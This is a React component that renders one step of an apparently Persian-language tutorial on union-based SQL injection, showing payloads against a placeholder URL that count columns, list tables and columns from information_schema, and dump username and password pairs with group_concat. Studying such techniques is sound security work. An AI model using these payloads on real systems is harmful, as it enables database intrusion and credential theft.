/** @format */
import Image from 'next/image'

import { Bold, Code, Step } from '@/app/Components/common'
import { Card } from '@/app/Components/common'
import Post1Image from '@/app/assets/images/post-1.png'
import Post2Image from '@/app/assets/images/post-2.png'
import Post3Image from '@/app/assets/images/post-3.png'

const url2 = 'https://test.com/post.php?id=-10'

export default function ThirdStep({ url }: { url: string }) {
  return (
    <Card simple={false} title='واکشی اطلاعات موجود در دیتابیس'>
      <Step type='GOAL'>اتصال اطلاعات جدوال دیتابیس به خروجی کوئری جهت نمایش در سایت</Step>
      <Step type='DESCRIPTION'>
        در این مرحله قصد داریم اطلاعات اضافه ای را به کوئری اصلی بچسبانیم تا همراه آن در سایت نمایش داده شود. برای این
        کار از دستور
        <Bold>union select</Bold> استفاده می شود که شرط کار کردن آن برابر بودن تعداد ستون های کوئری اصلی با تعداد ستون
        های موجود در union select است.
        <div>
          برای درک بهتر، موضوع را با یک سناریو پیش می بریم. فرض کنیم آدرس زیر
          <Code>{url}</Code>
          اطلاعات یه پست را در صفحه ی وب سایت نمایش می دهد. این اطلاعات شامل عنوان پست، متن پست، تصویر پست، تاریخ انتشار
          پست می باشد. مشابه تصویر شماتیک زیر:
        </div>
        <Image alt='post-1' width={500} height={500} src={Post1Image} className='mr-auto' />
        <p>حال آدرس زیر را فراخوانی می کنیم:</p>
        <Code>{`${url2}' union select 1,2,3,4,5,6,7--+`}</Code>
        <p>فرضا با تصویری مشابه زیر در وبسایت مواجه می شویم:</p>
        <Image alt='post-2' width={500} height={500} src={Post2Image} className='mr-auto' />
        <ul className='m-2'>
          <li>
            <Bold>۱-</Bold>
            این آدرس اطلاعات پست مورد نظر را به همراه یک رکورد اضافه با مقادیر ۱ تا ۷ را در وب سایت نمایش می دهد. که
            البته با قرار دادن مقدار <Bold>-</Bold> اطلاعات پست اصلی را حذف کرده ایم.
          </li>
          <li>
            <Bold>۲-</Bold>
            قرار دادن مقدار <Bold>-</Bold> قبل از <Bold>10</Bold> در کوئری صرفا این دلیل است که با وارد کردن یک مقدار
            نامعتبر مانع لود شدن دیتای اصلی کوئری شویم تا فقط مقدار حاصل از union select در وب سایت نمایش داده شود. چون
            مقدار id معمولا از ۱ شروع می شود در نتیجه مقادیر منفی نامعتبر هستند. لازم به ذکر است مقادیر نامعتبر دیگری
            مانند صفر، رشته و... هم می تواند جایگزین مقدار id شود ولی قرار دادن <Bold>-</Bold> هم ساده تر است هم مطمئن
            تر.
          </li>
          <li>
            <Bold>۳-</Bold>
            علت حذف اطلاعات اصلی کوئری صرفا جهت خلوت تر شدن وبسایت برای پیدا کردن اعداد union select در صفحه است.
          </li>
          <li>
            <Bold>۴-</Bold>
            اطلاعاتی که از تصویر دوم استخراج می شود به این صورت است که از ۷ ستون موجود در کوئری، ستون های ۳ و ۵ و ۱ و ۲
            در وبسایت نمایش داده می شوند. لزوما قرار نیست تمام ستون ها را مشاهده کنیم. برای مثال ممکن است ستونی تحت
            عنوان منتشر کننده پست نیز در کوئری وجود داشته باشد که به هر دلیلی در وبسایت نمایش داده نشده است. وجود یک
            ستون برای ادامه ی کار کافی است.
          </li>
          <li>
            <Bold>۵-</Bold>
            در union select مقدار مقادیر اهمیتی ندارد. بلکه تعداد آن مهم است. فرضا اگر آدرس زیر
            <Code>{`${url2}' union select 75,12,0,458,16,32,5--+`}</Code>
            را فراخوانی کنیم، با تصویر زیر مواجه می شویم:
            <Image alt='post-3' width={500} height={500} src={Post3Image} className='mr-auto' />
          </li>
        </ul>
        <p>
          اکنون می توانیم مقادیر موجود در union select را با دستورات SQL جایگزین کنیم و بجای مقادیر ۱ تا ۷، اطلاعاتی
          نظیر نام دیتابیس، ورژن دیتابیس، نام جدوال و... را نمایش دهیم.
        </p>
        <ul>
          <li>
            <Code>GROUP_CONCAT(username,--,password) {'==>'} username1--password1, username2--password2, ...</Code>
          </li>
          <li>
            <Code>information_schema.tables {'==>'} List of tables</Code>
          </li>
          <li>
            <Code>
              information_schema.tables WHERE table_schema = database() {'==>'} List of tables in current database
            </Code>
          </li>
          <li>
            <Code>
              information_schema.columns WHERE table_name = hex of users {'==>'} List of columns in users table
            </Code>
          </li>
        </ul>
      </Step>
      <Step type='METHOD'>
        در این مرحله ابتدا لیست جداول دیتابیس را واکشی می کنیم و در یکی از ستون های قابل مشاهده در وبسایت قرار می دهیم:
        <Code>
          {url2} union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where
          table_schema=database()--
        </Code>
        یا
        <Code>{`${url2}' union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database()--+`}</Code>
        <p>
          در این مرحله با پیدا کردن جداول مهم یا هر جدولی که اطلاعات آن را لازم داریم، اقدام به پیدا کردن ستون های آن
          جدول می کنیم. فرضا جدول مورد نظر ما users نام دارد. با دستور زیر لیست ستون های جدول users را واکشی می کنیم و
          در یکی از ستون های قابل مشاهده در وبسایت قرار می دهیم:
        </p>
        <Code>
          {url2} union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=hex
          value of users--
        </Code>
        یا
        <Code>{`${url2}' union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=hex value of users--+`}</Code>
        <p>
          دقت داشته باشید مقدار <Bold>table_name</Bold> باید مقدار <Bold>hex</Bold> نام جدول باشد
        </p>
        <p>
          با فرض اینکه لیست ستون ها بصورت id, name, email, username, password باشد، با دستور زیر اطلاعات سطر ها را واکشی
          می کنیم و در یکی از ستون های قابل مشاهده در وبسایت قرار می دهیم:
        </p>
        <Code>{url2} union select 1,2,group_concat(username,--,password),4,5,6,7 from login--</Code>
        یا
        <Code>{`${url2}' union select 1,2,group_concat(username,--,password),4,5,6,7 from login--+`}</Code>
      </Step>
      <Step type='QUERY'>
        <div>
          برای آدرس
          <Code>
            {url2} union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where
            table_schema=database()--
          </Code>
          کوئری ای مشابه
          <Code>
            $query = SELECT id, title, body, image, publish_date, publisher_name, created_at UNION SELECT 1, 2,
            GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
          </Code>
          در سمت بک اند اجرا می شود.
        </div>
        <hr />
        <div>
          برای آدرس
          <Code>{url2} union select 1,2,group_concat(username,--,password),4,5,6,7 from login--</Code>
          کوئری ای مشابه
          <Code>
            $query = SELECT id, title, body, image, publish_date, publisher_name, created_at UNION SELECT 1, 2,
            GROUP_CONCAT(username,--,password) FROM login
          </Code>
          در سمت بک اند اجرا می شود.
        </div>
        <p>
          علت استفاده از <Bold>GROUP_CONCAT</Bold> به این دلیل است که بتوانیم لیست تمام ستون ها، جدول ها و کلا هر
          اطلاعاتی که تعداد آن را نمی دانیم را بصورت یک رشته با جدا کننده ی کاما در یک ستون قابل مشاهده در وبسایت نمایش
          دهیم. مثلا در حالت عادی دستور <Bold>table_name</Bold> یا <Bold>column_name</Bold> به ترتیب <Bold>لیستی</Bold>
          از رکورد شامل نام جدول ها و نام ستون ها را واکشی می کند که در حالت عادی قابل نمایش در یک ستون قابل مشاهده در
          وبسایت را نیستند. دستور <Bold>GROUP_CONCAT</Bold> خروجی را از حالت <Bold>لیست</Bold> به حالت <Bold>رشته</Bold>
          در می آورد که به راحتی قابل نمایش در یک ستون قابل مشاهده در وبسایت است.
        </p>
      </Step>
    </Card>
  )
}
